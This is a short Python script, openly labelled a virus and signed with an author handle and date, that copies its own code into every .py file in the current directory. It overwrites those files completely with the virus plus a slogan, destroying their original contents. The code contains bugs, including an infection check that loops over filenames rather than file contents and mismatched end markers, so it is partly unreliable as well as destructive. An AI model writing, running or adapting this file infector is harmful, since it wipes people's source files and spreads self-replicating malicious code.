#LeighTrinity
#Dec 8 2021


#Start virus
import sys
import glob
from threading import *

class Virus(Thread):
    def run(self):
        Code=[]
        with open(sys.argv[0], 'r') as f:
            lines = f.readlines()

        print('Searching for virus to copy...')
        replicate = False
        for i in lines:
            if i == "#Start virus\n":
                replicate = True
                print('Success!')
            if replicate:
                Code.append(i)
            if i =='#end\n':
                break


        scripts = glob.glob ('*.py')
        print('Searching for files!')
        infections = 0
        alreadyInfected = -1
        toCheck = len(scripts) -1
        for script in scripts:
            with open(script,'r') as f:
                scriptCOde = f.readlines()
            infectedCode= []
            infectedCode.extend(Code)
            infectedCode.extend('\n')
            infectedCode.extend('Trans rights are human rights')
            infected = False
            for lines in script:
                if lines == "#Start virus\n":
                    infected = True
                    alreadyInfected = alreadyInfected +1
                    break
            if not infected:
                 with open(script, 'w') as f:
                     f.writelines(infectedCode)
                     infections = infections +1
        print(f'Tested;(toCheck) \n Infections:{infections}\n Already infected:{alreadyInfected}')

Virus= Virus()

Virus.start()

    #End
